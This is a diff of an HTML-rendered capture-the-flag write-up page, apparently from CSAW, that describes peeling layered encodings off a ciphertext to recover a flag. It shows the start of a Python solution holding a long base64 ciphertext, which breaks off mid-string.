-&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;{}{}&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'{}{}'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;From this code we clearly see what we have to do is take the first integer of the output (which is the long string after the print), subtract one, and apply the decryption cipers (which we had to make) based on that integer. We can keep doing this until the final string contains the word flag. The following code is my final code to get the flag.&lt;/p&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://viviturtle.github.io/assets/csaw/net_solution.py&quot;&gt;net_solution.py&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/csaw/net_solution.py&quot;&gt;net_solution.py&lt;/a&gt;&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b64decode&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;ciph&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&#39;2Mk16Sk5iakYxVFZoS1RsWnZXbFZaYjFaa1prWmFkMDVWVGs1U2IyODFXa1ZuTUZadU1YVldiVkphVFVaS1dGWXlkbUZXTVdkMVprWnJWMlZHYzFsWGJscHVVekpOWVZaeFZsUmxWMnR5VkZabU5HaFdaM1pYY0hkdVRXOWFSMVJXYTA5V1YwcElhRVpTVm1WSGExUldWbHBrWm05dk5sSnZVbXhTVm5OWVZtNW1NV1l4V1dGVWJscFVaWEJoVjFsdVdtUm5iMUpYVjNGS2IxWlViMWhXVnpFd1YwWktkbVpGWVZkbFIxRXdWa1JHVDJZeFRuWlhjRzlUWlZkclkxWlhZVk5TYmpGSFZsaHJaRkpVYjFOWmJsVXhWakZTVjFkd09WaFNNRlkyVmxjMVIxWldXa1pUY0d0WFpVWnpZbHBYWVhwVFYwWkhWM0JyVG1Wd2EydFdjSE5MVFVkSllsWnVaMWRsYm5OWldWUk9VMlV4VWxkWGJuZFVWbTl6V0Zad2QyNWtWbHAxVGxabldsWldWV0ZXYmxwTFZqRk9kV1pHYTJ0a01YTlpWbGN4WTJoR1NsZGxNM05yVW00MVdGbFVUa05OVmxwWVprVk9iV1ZXUmpWV2NIZHlaRzlLV0doRk9WVldjRkpVVm5CaFZtaEdaM1ZuUm1kVFpHTldXRlp3TVhwVk1XZDNVMjl2Vm1ReVVsWldiMmRUVlVaV2RGSndkMjFsU0VKSFZHOWFibFV4V25oUmJqRlhWak5yV0ZSdVdsTldNVko0Vm05T2EwMXdhMVpXY0dGdVpURlJZVmR4VWs5V1ZUVllWWEIzWkZkR2JucFdjSGRYWlZWYVlsWXlkalZXY0VwSFYzRmFWV1ZHY3pOWk1tRlhabkJLU0dSRk5WZE5WWE5JVm05U1IxWXlUblZOVm1kVVpXNWFWVmxVUm1SVU1WbDZWbkZhVGxKd1VsbFpNRlp1VlhCS1JrNVZiMXBOUjJ0TVdWY3hTMmRIVmtaYVJtZHJaREJ6Y2xaVVJtUldjRlpJVTI1YVdHUmpWbFZWYjFwNlVtOWFWMWR2WjJ4bFZrWTFWWEExUzFkSFJXSmtSazVYWlZock0xbFZXbVJXTWtaSlZHOVdVMlF6UW1SWFYzZFhaekZaZWsxVldsaGxSa3BYVkZablUxTkdXa2hvUm1kWFRWWktNVlp3WVhKa1ZrcFlaMk5DVjFaRmNucGFSRUV4VTBaYWRtUkdVbXhsVjJ0WVYxY3hORmxXWjFkV2NVcFhaVlJXVUZad1lYcFNNVnAyWkVkM1YyUmpSa2xXVjNkeVZuQkdkVkpVUWxWV00ydFFWbkF4UjFKV1ZuZGtSMnRPWlZaRllsWXhVa2RsTVZsaVZXOXJWMlZ2V2xoWlZFSjZabFp2VlZOd09VOVNiMWt5VlZjMVMyUXdNVlpPVlc5YVRVZFNTRlpVUVdGU01WcFpaRVphYkZkRlNrMVdSbHBrVkRGYWRsZHhSbFZsUmxwUFZtMUdTMU5XWjNaV2IxcHZVbTV6WTFVeGEzWlZNa1Y2WmtaQ1ZtVkhVVEJWWTBaYWFGZE9SbFJ2Vmxka1kxWktWakozWkdVeFdrZFhjVXB0VWxSV1pGbHVXbVJuVm5ORlVuRmFiMUp2U2pCVmNHRnVWVEF3WVZOdU5WZFdSVzVoV1cxQllWTkdTbmhXYjBwWVVqTnJXRlpHV21SWlZrNVhWVzluVjJWdU5WaFVWM2Q2VFZadWVsVnVaMWhTYjNOWVdYRnpTMWxXU25abVNFcFdUWEZPTkZVd1dsTm1NWE5IVkhCclRtVndhMUZXY0RCaFRrZFJZVlZ1WjJ0Tk1sSnlWVzlyVTJZeFduWmFSRkpYVm5CaFlWVlhNRFZXUjBwSWFFWnZWVTFXYzJ0V1ZFWmtaMGRHUlZKdloydE5iMFl6VmxoelIxTXhXbGRUY1VwWVpWZHJjMWxVUm5wV2IxbGhWVzVuV2xZeFNsaFdjRFZYVlRKS1IyWkdWbFpsUjFKMFdsVmFVMVp2V25kU2JqbFhaR05XV0ZZeWQzSmtNVnAzVTNGS1ZHVndhMlJVVlZwNlZVWldkMmhIZDIxbFIxSmpWa2RoVTFZd01YZGtSV3RYVmtWS2VWWnRRVEZTTVZaMlpVZHJVMUpWYzNsWFZsSlBaREExZGxadloxWmxWVnBVVkZabk5GWXhVV0ZXY1U1WFZtNXpXbFZYTlVkV2NFWjFVMjluWkZKRldsQldNRnBYWjFaYWRscEdUbGRTVm5Oa1ZuQnpTMDVHV1dKU2NVNVdaREZ6V1ZsdVZucFdNVkpYV2taT1QxSnZTbGRXY0hOVFpERktkV1ZqU2xaTlZrcElWbkIyWVZJeFduUlZiM05PVm05dk0xWlhNVFJXTWxKWVUyNXJiMUl6UWxSVmIxWjZWRVphZEZKd2MwNVdiM05qVm05cmNsWndSV05SYjJkVlZqTk9ORlJ2V2xkbU1rWklUMVU1VjJReWVtTldiMlpoWlRKR2RsZFlhMVJrTTBKV1ZtOW5jbWh2V2xWU2JuZHRUVlp6TUZrd1dsTlZNV2RJWkVWaFYyVllRbEJaYlVwVFowWmFkVmR3YjFOV01VcGhWMWN3WVdVeFJXRlhXR2RYWlZSdlQxUldXbGROTVc1NlZuQkdiRkp1YnpOVWIxcDJWbTR4UjFOdVVsWk5WMUpIV2tSR1YyWndUa2hvUm1kVFpESTVORll5WVc1TlJsbDZUbGhPVkdWdlduSlZibFprVjBaU1ZtUkZUbFJsUmxZMFZqSXhNRlV5U2taTlZGcFdaVVpLVEZZd1owdFNNVTUxV2taelYxWXlhMDFXVkVadVZERmFkbFZ4U2xSbFJrcFVWbkJoZWxkV1dsaG1SV2RYVFZaS1lsUnZXbVJYUm1kSWFFWlNWMlZIVVRCVmJVWjZVbFpHVlZadlVsTmtNMEkwVmxabU1XVXhXV0ZYYjJ0VlpHOUtXRlZ3TVU1b1JsWjBVVmhyVjJWRmMyTldNbUZQVmpKRlkxRnhhMWRrTVVwRVdXTkJNVll5U2tsVmNITlVVbTl6V0ZkWE1HRk9SbHBYWkROcmExSmpWbEJWYlVKWFRURnVlbFZ1T1ZkV1ZFWkhWakozTkZZeVJXRm1Sa0pYVFVkU1VGcEdaMHRTYjJkMldrWk9WMUpWYm1GV01uZFhaREF4U0ZadloxVmxSMUpyVlc1YVMxVXhXbmRvUjBaUFVuQlNXVlJWVWxkV01VcDFUbFpyVmsxeFVuVldibHBMVW05bmRsSnZXazVrYjFveVZrWmFaRk53VVdGa00zTmtVbTlLV0ZSVldubG9SbHAyV1ROcmEwMVdWalJWTWpWUFZrZEdkVmR1T1ZwV1JWcGtWRlZhZWxJeFozZG5SbEpzVm05eldsWnVaekJsTWtaM1UzRlNhMU5IWVZoV2JsWjFhRVpTZDJoSVowOWxSVnBpVmpJeE5GWXlTbGRUYmxKWFZtOXpkVlZ0UVRGV01XZDRWbTlLYkZKdWMxUldjREF4VVRGT1IxVnZaMWRrTWxKV1ZYQjNlbFp2VmxobVJXZHJVakJXTlZkdVVrOVpWbHBZVlZoblpGSXphMWRhUkVGaFYxWmFkbFJ3YjFkV2NVSTBWbkIzVjFZd05VZFViMnRXWlVaemExVnZWbnBXVmxaMldrUk9UbVZHV2pGWk1GWnVaVVpKWVZOdloxcGtNVm96Vm0xQllXWldTblZsUmxwdlpEQlpNRlp2Vm1SVU1XZFlVMjVyYlZKdU5WaFdiVXBTYUc5WllXUklaMWROVlc4MFZrZGhaRlV5U2tabVJsSmFWa1UxUTFwVldtNW5SMUpKVkc0NWJGSnZXVEJXTW5keVpqSktSMWR2WjFobFJscFlWRmMxVW1jeGIxaG9SVnB1VFZkU1lWWXlZWHBVY0VwSlVXNVNWMVpGU25sVlZFcFBWakZPV1ZwSGIxTlNWbk5aVmxkaFpHWXdOVmRtUldka1VrVktWRlJXVlRGVGIxcDNUVmhPVm1WR2MyTldNVkpIVmpBeFdHUkZZVlZsUjFKUVZqQlZNVlp1TlZaT1ZrNVRWbkZDVGxadlVrcE5WMDFoVTNGT2JWTkdXbFJaYmxwTFdWWlNWbHBFVWxSbFJrcFhXVlZXYmxZeFNuWlRiMXBXVFhGQ1NGbHVaMHRtY0VsalprWm5VMUpWYzBsV1dITkhWakpTV0ZKdWIxUmxXRUp6Vm05YWVVMUdXbmROV0hOdlVsUldXRlZ3WVdSV1YwcDNhRVpXVmsxSFVUQldSbHBYVmpGYWQwOVdVbGROUmxreFZrUkdaRlF4V2xkWGJscFBWa1ZhVjFwWGQwWk5WbFZoVjI1M1dGWXdOVVpXY0dGWFZHNHhSbVpGZDFoV1JWcHJWMVpuVTFZeFozWlhiMmRzVWpOclYxWndkMWRTTURWSFYyNWFhMUpZVWxWV2JVWkxVbTlhZDJkSVoxVmxSVFZKV2xWblIxWnVNVWRUYm10WFVqTnJkVlZ3ZG1GVFYwcEhWRzlyVkZKVmMwcFdiMmQ2VVc0eFdGUnhUbE5sUm5OMVZXNWFaRmRHVWxaWGJuZFZWbTlhWTFkWWMwZFdSMHBIVm0xYVZtVlVRVEZaVnpGR2FGZFdSMlZHYzFkTk1VbzFWMjVTUzFKd1ZrZGFTRXByVW05S1dWVnRUbkpXYjFwWVRWUkNUbEl3V21OV1IzZGtWakpHZGxkdlVsZGtialZFVkZkaGJsWXlSa2xVYjJkT1ZtNXpXVlp3TVRCWlZsbGlVMjV2VWxkSVFsZFVWVnBMVTBaVmVsZHZaMWROVmtwV1ZUSmhVMVl5UldOUmIwSlhUVlp6YTFwRVJrOVhSbHAyV2taV2EyaHZXbEJYVjJGeVZURlpZVlp4VW05U1ZHOVZXVzVXZGsweFdXSm9SVGxYVm05elkxa3dWbE5XYmpGWFZtMVNaRkp2YzFCV2JVWlBaakZTZFU1V1oxZGxTRUpNVmpKM1pHVXlSV0pXYm1kWFYwZGhWVmx3ZDJSV1JsSldXa1JTVDFKdlNtTldjR0Y2WkRBeFJWSnZaMXBXVmxwclZsUkJZVkpXVmxsa1JscHNaVzVLVVZaSFlXUlhjRkZoV2toS2ExSnZjMDlVVmxwNlUxWmFkMmRHWjFkTmJqVllWVEpoYmxaSFJuWlhiMnRWVmxaelRGVXlZWHBTTVdkNFZIQjNWMlZHY21GV2NHRlRVakZWWVZkdVdsaGtiMHBZVlc1V1MwMHhVbmRvU0VwdVRWWktZbGt3WnpSVk1EQjZVMjFXVjFaalJYcFpZMFpQWjBaT2VGTndiMU5sUlhOclYyOW5NR2N4U1dGbVJtZFlaR052VkZWdFFuWk9WbFozWmtWblZrMXVWalJaTUZaMlZqRktkbVpHVWxaa2JscFhXa1JHUzJkV1VuWlVjRzlUWkRJNGVsWnRSbTVOUmtsaFZXNXJWbVZIYTFSWmNERlRWakZTVmxad1JrNVdiMVl6VjI1V2JsVndSalpTYm1kWFpWaHJVRmxVUm1SWFJsWjFhRVpuYTAxWVFsRldjSE5IVkRGS1YxVnhWbXRTVkc5WVZtMU9jbFJXWjNWWGNEbHVUVlZ2TkZVeGEyNVZNa1ZpVlhGR1YyVkhhMVJVYmxwVFYwZFNSMVJ2VW14U1dFSlhWbTFKWVZJeFdrZFRjVXB0VTBoQ1pGUlhOVk5uYjFKMlYyOWFiazFYT1RaWlZWcDZaRlpuUmxOWWExZGxSMUkyV2tSQllXWXhVblphUmxwc1pETkNVRlpHVm1Sbk1VNTJaa1puVm1WSFVuWlZjSFl4VWpGdmRWcEVRbXRXVkVaWFdUQlNVMVl3TVVkWGNFWmtWbFp6YTFSd1lVZG1iMmQyVjNCdlYxWkdXbE5XTVZKSFZURkZlazFXWjIxU1ZuTlpXVlJLY2xVeFduZG9SWGRVWlVaV05GWndkMlJrTURGV1prWnJWazF4UWxoWFZtZEdhRmRTTmxOdloxZFNWWE15VmpGYVpGUXhXblpUY1ZaWFpVWmFXRlZ2WmpWT1JscDBVbkE1VkUxV2MxaFdWMkZrVmxkRmVtWkdhMWROUm5OclZXTkdWbWN4YzBaYVJrcHNWbTV6V0ZadFNqQk9SbWQxVFZWcmExSllhMnRXY0dGa2FHOXZWMWR1YzI5U2JqVmlXVzVuY2xSdlNXTlZWRVpYVmtWYWRGUldXa3BvUmxwNFVtOUtXRkl4U2xWV1JscFhXVlpGWVZwSVVtNVNZMjlRVlhCaFMxWXhaM1ZXYjJkWFVtNDFTRll5WVdSV2NFcFpWWEZ6VmxZemEydFdjR0Z1WmpGV2RscEZOVk5XY1VKT1ZuQXhOR1V5VFdGYVJXZFVaREZ6YzFWdlducG1iMXAyV2tkM1RrMVdjMVpWY0RWUFZUSktSbVZFVGxWTlZrcFVXVlpuUzJkSFJrVlViM05YVFRGS1lsWlVSbVJVTVdkWFYzRktaRkp2U25OWmJscDZVMjlhV0doR1oydE5Wa1l6Vkc5YVpGZEdaMGhWY1VaWFpWaHJhMVZ3WVZab1IwWkdXa1puVTJWRmMxZFdWbHB5WlRGYWRVMVZaMWhXUlVwclZuQmhTMlJHYzFaV1dHdHRUVlpLWVZZeVlWTlZNVXBYWmtaQ1YxSXphM1JVVmxwa1UwWlNkbVJHV210TldFSlZWa1pXVTJZeFJXRlhibWRZWlVkU1VGWndZWHBOVmxWaVRWYzVWMlJqUmxoVk1uTkhWakpLU0ZWdlFsZE5jV3RNVm05YVIyWldTbmRuUlRWT1VuRkNWbFl5ZDJSV01rMWhWSEZLVGxaWFlWaFpibHBrVmtadlZWUnZUbTFXYjBwV1ZWZGhibFJ1TVZaWGIydFlaREZhZFZaSGRucG9WMVpIV2taYVRsWnVjMDFYVm1jMFpERktkMUp1VmxobFdGSllWakJXUzFJeFozWldjSGRyVFc1eldGWkhZVzVXUjBWaWFFYzVXbFpGYzNWVVZFWnVabFpLZFU5WGQxZE5Wbk0xVm05YWNtUXlSblpYYmxwc1RUSnJXVmx2YTFOb1ZuTkZVbTQ1VjAxWVFrcFpibWMwVmpGYWRtWkhPVmRXWTBZelZXMUdSMll4WjFsbVJsSnJUWEZyYTFkWFlYSlZNVWxoVlc5YVYyVkhVbGhVVmxaNmFGWnVlbFp3Umxka1kwWklXVzVTWkZkR1drWlRXR2RXYUc1eldGcEZXbE5tY0VaSFZIQnJhMDFIT0hwV2NEQmhhSEJXUjFkdWExVmxSMUp5Vlc5clExWldXblpXY0VaVlVuQjNOVlJ2YTA5V01VcDFaVVJhVmxZelFtdFdjSFpoVWpKT1JWSnZaMWRsUm5NMVZrWldaRlV4V2xkVWNVcFhaR05XV0Zad05VTlVWbWRWVW05blUwMVZNVFJXY0RWWFZuQktkVTVZUmxabFdFMWhWVzFHWkZaV1NuaGFSbFpUWlZoUk1sZFVRbkptTVZsaFZHNWFXRlpGU2xkV2NHRmtUVEZhZFZkd1JtNVdialZoVm5CaFYxZEdTblptUlc5WVpERktSRmxqUmxkU01VNVpaRVpTYkZaR1dsUlhWekV3VWpBMWRtWkdaMWhsV0ZKVVdXNVZNVll4Vm5kT1ZtZFlVakJ6U0ZVeWQwOVhjRXBIVjIxT1ZXVkdjMHhXYjFwSFoxWnpSazVXVGxkU1ZuTmFWbTltWVU1R1dXRlZjVTVYVjBkU1QxVXdhME5XYjNOWVowVjNWRlp2VmpOWlZWcHVWWEJLUmxkdloxcFdWa3BVV1ZWblMyWnZUblpXYjJkVFpVaENWVlpVU2pSV01rMWhWRzl2WkZKdU5WaFdiVXB1VGtaWllWcEVVbTVOVlRWWlZuQmhjbFV5U2xaWGIxSlZWbFphYTFad1lWZG5SMVpIVkc5T2EyaHVXa2hXY0RGNlZqRlZZVmR2Vm14U1YxSldWbTlhWkdodmIxWmFSVGxUVFZaellsWXlZWEprUlRGWlVXOW5WMVp2YzNSYVZXZFhWakZTZFdWR1RtdE5WWE5oVm5CM1YxTXhVV0ZXY1U1WFpWUldkbFZ3TVRCT1JscElUbFpuYkZJd1ZqUlZjSE5UVm5CS1IyWkZZVlZXYjNOaldUSmhaR1pXWjNaWGJqVlhUVEpuTkZad1lWTlNNa1ZoVjI5blZXVkhVbFZaYmxwTFpURlNWbGR3UmxWU2NVSklWbkF4TUZaSFJqWlNibTlYVWpOcmRWWlVRV0ZUUmxaMVQxWm5WMUpWYzNKV2NIZGtVakZuUmsxV1dsaGxXRkpQVlc5YWVsTnZXbFZTYjJkc1RWWktZMWR1Vm1SWlZUQmlWVzlHVjJWVVJsUldSRVoyWmpGbmRXWkhZVmRsUlhOSVYxWldVMVl5U2tkVWJscFlaVVphV1ZadVZucFRSbWRYVjI0NVUyVkZjMk5XTW1GVFZqRm5SbE51YTFkU2IxcFlWRzVhVDJZeFozUlhiMnRyVFRCS1ZsWlVRbVJXTURWWFZuRk9WMlZVYjFoVmNHRjZVakZ2VmxWd1JsWk5WbTgyVlZkelYxWnVNVWhrUm10VlpERnpTRlp3TVZOVFIwNUhXa2RyVGxkRlNrdFdiMUpIV1ZkUllXVkdaMWhrTW1GWVdXNVdTMVpHV1hwYVJ6VnVUVmRoVmxWWE1UQldiakZXVGxaclYyVllVbmxaVkVGaFUwZFNSVmR2WjA1bGNHdE5Wa2RoWkZad1VXRmFTRTVZWlVaYVdGWnVaek5OUmxwSFZtOWFiMUp1TlZoVk1uZGtXVlpLVm1aR1oxVldjR3RFVm5CaFYyWXhXbFZXYjFKT1pVWnlZVlp3TUhwb1JscElVMjVuVkdWR1dsaFVWVnBrVjBaVlltaEZkMWROVmxveFZuQXhORll4V2xkbVIydFhWak5yYTFWalFXRlhSa3A0VTI5YWEwMXhhMk5XVjNOUFVUQTFWMlpHV210VFJUVllXVzlWTVZkdmIzVldibmRYVW01eldGWXhhM3BXYjFwMlYzRktWbVJ1V2xoWk1uWmhWMGRTUjFadloydE5XRUpOVm5BeE1GbFhVV0ZYY1U1VVpERmFVMWxZYzBkV1ZscDJWMjUzYjFadlZqTldWM2RQVkc5YWRtVkVUbGRXTTFKalZqSjJZVmRIUmtaUFZsWlhhRzlhV0ZkdVVrZFRNbEpZVTI1YWJWSnZTazlWY0dGMWFGWmFkbFZ1WjJ4TlZYTllWa2RoWkZZeVNsWlhiMUphWkRGemExVnRSbTVtVmxKMVowWm5WMDFWYzFsV01uZFhWakZTZGxOWVowOVdWMnRYV1ZkM1MyaHZVblpXVkVaWFpVZFNZMVl5WVZkbFIwVjZaa1Z2VjJWR2MxZFViMXBQVWpGU2VGTndhMU5OTUVwalYxWlNTMVF3TUdGWGIxWlZaVWRTVlZadFJtUldNVlozWjBSQ1ZrMUVSa2xXVjJGWFZqRktSbE54Vm1SV1ZuTmlXa1JLUzFOV1duWlhjRzlYVFZWelYxWXhabnBOVjFGaFUzRk9iVkpXYzFoWmJsVXhabTlhZFZadWQxSk5WbFl6VjI1cmJtUndTbFpPVkVKV1pWaFNhMWxXWjBab1IwNUhWWEJHVTJWRmMwMVdWekUwVkRKU1IxVnhVbXhTTTBKWVdWUkpOR2N4WjFob1JtZHNUVzVhU0ZVeVlXNVdWMFZqVVc5clYyVkdTbU5VVlZwV2FGVTFXR2RHV2xObFJsa3hWa1JHVjJZeFdrZFRXSE5TWkdOdldGbFVSbGROTVZKV1drVjNiVTFXV2pGVk1tRlRaRmRGWVdVeloxZGxWRll6VlZSR1RtaEdaM1ZhUmxaclRUQktWVmRYZDJSWlZsRmhWMjlXVkZaRldsQlpibFo2VmpGelJsWllhMWRTYjNOWVZYQnpVMVp1TVZoa1JFNVhaREZ6WkZwWFlVOW1WbFoyVjI0MWEyVkdjMDFXYjFKTFRVWlpZbE5ZYTFSbFJuTjBWVEJuY21ZeFZuWlZibHBPVW05S1YxZHVhMjVrTVZwMlYyMUdXbGRJUWt4V1ZFcEdhRzlHZFZwR1drNWxiMGxqVmtkaFpGTXhXblZQVmxwa1VsUldWRlp1Vm1SVVJtZFlUVlJTVkdSalZsaFhibXRMVjBkS1JrNVZPVmRsUjJ0NVZHOWFWbWN5UmtkYVJsSlRaR05XVjFaWE1HRm1Na1pJVWxocmJWSllRbVJXTUd0RFZrWm5WMWR3UmxSV2IzTmlXVlZhVTJSWFNsaGFSRkpYWkc1dVlWVnRSbFpvUms1MldrZHJVMVp4UWxaV2JVSmtWM0JXUjFkdVoxWmtNbEprVm0xQ1YwMHhXblprUjNkYVZsUkNOVmxWVms5V01rcElaRVZTWkZKV2MxQlZiMXBUWmpGR2RscEdUbGRsYmtwTVZuQmhjbWN4VVdGVGNWSlhaVzlhVkZsdlp6UldSbEpXV2tjNVZFMVhVbGxhUlZwdVZrZEtSbGR2YjFWbFIxSklWbkF4UjJadlozVlBWbk5PWlc5S05sWlhNVFJuTWxKWFVuRktiRkp2V2xSVVZFWktUVlpuZGxad2QxVk5Wbk5qVlRKaFYxVnZXa2RUYmpsWFpVZHJRMVJXV2xab1JscDBVVzlPYTJodVdraFdjREUwWnpKR1dGTnVaMWhrYjBwWVdXOVNRbWhHVW5kTlZrNVRWbTQxWWxZeVlVOVViMHBJWmpObldGWmpRV0ZaYlVFeFUwWktlRlJ3YzFOWFJVcGlWbTFDWkZsV1RrZFZiMVpVWkdOV2RWUldWbnBYYjI1NlpFYzVWMDF1YzJKV01WSkRWakZLZG1aSVNsWmtibHBQV2tSR1pHWXhWbmRsUjI5VFpETkJNVlp2VWt0TlIwVmhWRzVuVjFkSFVsUlpWRVprVmxaVmVscEVVbFJXYjFwaVZuQXdNVlF4V25aV2JVNVZWbGRyWTFsVVJtUm5SMFpHYUVkR1YxWXlhMWhYYmxKSFZURlpZVlJ4U20xU2IwcFVXbGN4TkZadldsVlNjRVpXVFZWdk0xUldWblprVmtsNlYyOVNWMlZIYTBSVWJscDZWbTlhZFZwR1oyeFdibk5aVm0xS01HUXhXV0ZYYjJ0dlVtOXpWMWx2YTNKVlJsWllUVlZhYmsxdU5VWldjR0ZQVmpGYVNHaEZZVmRXUlVwWFdsVmFibFl4VW5WV2IwcFhVbTl6V1ZaR1duSlJNVnAyVm05bldrMHlhMVpXY0hZeFUyOVdkMmRHVGxkU2IzTlpXVlZWTlZkR1duZFVXR3RYWkRKU1dGWnRTa2RTYmpWV1RsVTFVMUl6YTA5V2IyWjZUVmROWVZwRmExWlhTRUpUVmpCblUxWkdXbmROVms1UFZuQlNXRmxWVm01a01WcDFaa2h6VjFJelVreFdWMkZrVmpGbmRXaEdjMDVXTVVweVZsUkdWbWhHVGxoU2JtOVRaVVphV0ZWdlVsZFZSbHAyVlc1T1dsWnZTa2haVkU1dVpGWktWMlpJVGxaTlJuTnJXVEJhVjJkWFRrWlVjR3RzVm05ek5WZFdVazlrTWtaMlYzRlNWbVF6UW10V2NYTkhUVzl6UlZKdlRsTmxWVnBKVkc5YWVtUlhSWHBtUlhkWVpERnpkVlpVUmt0bU1WSlpXa1pDVjJWRmMxVlhWM2RrVXpKU1YxVnZXbGRsVlZwVlZYQmhSMDVXVldKblIzZFhUVlp2TTFSdlducFdNREY0VlZoblZtVlVSbFJXY0RGTFVqRm5kbVpGTlZOTk1tdEpWbTlTU2sxWFRXRlVibWRWWlc5S1ZGbHdNWEpaVmxwMldrZDNUMUp2VmpSV01uWTFWVEF4VmsxVVZsZFNNMUo1Vm01blMyZEdjelpTYjJ0c1VqSnJTVlp2VWtkVU1XZEhVM0ZXV0dWR2MwOVVWVnA1YUVaYWRGTnRRbTVOYmpWWFZGWldkbFV4WjBob1NFNVhaRzQxUkZaRlducFdiMXBaWkVaU1YyUXpRa2hYYmxaa1ZURlpZVk52YTJSb2JuTlhXVlJHUzFOR1ZuZE5Wa3B1VFVSdlYxVXlZVXRXTWtWaVp6TnpXRlp2U2tSV1ZFWlRVakZuV1dSR1dtdE5NRXBaVm5CaFUxVXdOVWRXY1U1WFpWaFNXRlZ3WVhaTk1WcDJaRWQzV0dSalJraFpNR2R5Vm00eFNHUkliMVZXYjNOTVdUSXhUMUpXU25WT1ZrNVlVbFZXTkZadlVrZGtNVTFoVkc1YVRsWldjM05WYmxwNlZrWnpXR1pqUmxOTlZuTmhWWEExWkdWR1NuWmxSRlpWVm05YWRWWlVRV0ZXTWtwRlZXOXpUbFp1YzBWV2JtYzBVekpTUms1V1oxVmxWMnQyV1c1YWVsTldXbmRuUm1kV1RXNDFZMVV5WVc1V1IwcFlhRVpDVjJWR1dtdFdibHBrVWpGbmQwOVdVbGRXUlZwSlZtNW5ORll4VldKVGJscHNhRzVhV0ZSWE5WTldNWE5GVTI5blYyVlZOVXBaVlZwa1pFZEZlbVV6WjFkV1JVcDBXbFZhVTJZeFozWlhiMnRzVmpKcmExWkdWbkpSTVZKSFprVldVbVF5VWxsVmNIZDZhRVpXV0daalJsZE5Wbk5aVmtkelYxWXhTbmRVV0d0a1VtOXphMVV3WjFOU01XZDNaa2RyVG1Wd2ExZFdiMXBUVVRKTllWWlliMVpsUjJ0WFdWUktORlF4V25aYVNITnVUVlp2TlZwVldrOVZNa3BHVGxSR1ZtVlVWbFJXYjFWaFVtOW5kV2RHV2s1U01tdFlWMjlhWkZReFNsZFRjVXBZWlZoU1dGcFhZVlpvVm1kMVYzQkdXbFp1YzJOV1IzZDJWakpHZGxOdmIxcFdSWE41V2xWYWRsZEhVa2RhUm1kc1VsWnpaRlp3TVRCa01WbGhWMWhuVDFaWVVsZFpibWR5VFRGYVNHaEZjMjVOVjFKaFZsZGhlbFJ3U2tabFkwWllaVVp6ZVZWdFJtUldNVkoxWlVkR1RrMXdhMWRXVjJGa1YyNHhSMlF6YTFkV1JscFZXVzVhWkdoV2MxWmtSazVYVW01elIxVXlOWFpXTURGSFZtMU9aRll6YTFOYVZWcGtabTl6UjFSdU5WTlNiM0l3VmpGU1ExVXhUV0ZYYm1kVlpESmhVMWx1V2t0bWIxcDFWM0ZuYTFKdlZqTldNbmQ2WkRBeGRVNVliMXBrTVZwTVZtMUJZVkl4VG5WbVJtdFhVbFp6Y2xkdlZtUldjRkY2VFZaclUyVllRbGxWYlVweVZtOWFkVlZ1VGxwV2JqVmpWa2RoY2xaSFJXSmtSVGxWVmtWeU1GWXhXbGRtTVZwNFZHOUthMmh2V2pWV2JVbzBWakpHUmsxV1oxUmtZMVpYVkZaYVpGWXhjMFZUYmpsVFpWVmFSMWx1WjNKa1JURkpVVzlTVjJReFNraFdSRXBUVmpGYWVGWndiMU5sU0VKVlYxY3dZVTVHVFdGV2NWSlBWbFZ6ZFZSWGQxZE9WbHBJVGxkM1YyUmpRalJXTW1Ga1ZtNHhWMWR4V2xWa01sSk1WbkJoWkdaV1ZuZG1SbWRYVFZWelRGWnVXbGRsTVZWaVZIRlNWRmRIYTFaWldITlhaa1p2VlZOdFVsZE5WbHBqVmxkM1QxWkZNWFpYYjJkYVpESlNZMVl3WjBab1YwWkdaMFpuVGxZd01UUldjR0ZrVlRGWllsUnVXbVJTY0ZKVVZuQjNlV2N4V2xoTlZGSlRUVlp6UjFSdmEwdFdjRVZqVVhCR1ZWWlhVVEJVVmxwa1puQkdTVlJ2WjFObFZrbzJWbkF3WVdjeFduWlRiMjlTVmtWS2ExVndNVk5VUmxaM